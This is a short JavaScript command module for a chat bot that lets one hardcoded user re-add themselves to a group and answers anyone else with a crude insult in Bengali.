const axios = require("axios");
const fs = require("fs-extra");

module.exports = {
  config: {
    name: "xdlamgc",
    version: "1.0",
    author: "AYAN BBE💋",
    countDown: 0,
    role: 0,
    shortDescription: {
      en: "Fuck you"
    },
    category: "angry",
  },

  onStart: async function ({ api, event }) {
    if (event.senderID !== "61584308632995") {
      return api.sendMessage(
        "- তর এতবড় সাহস গ্রুপ নষ্ট করবি, হালা রে পিডা কেউ..!😾",
        event.threadID,
        event.messageID
      );
    }

    const targetUID = "61584308632995";
    const threadID = event.threadID;

    try {
      await api.addUserToGroup(targetUID, threadID);
      await api.approveChatJoinRequest(threadID, targetUID);
    } catch (err) {
      // silent error
    }
  }
};
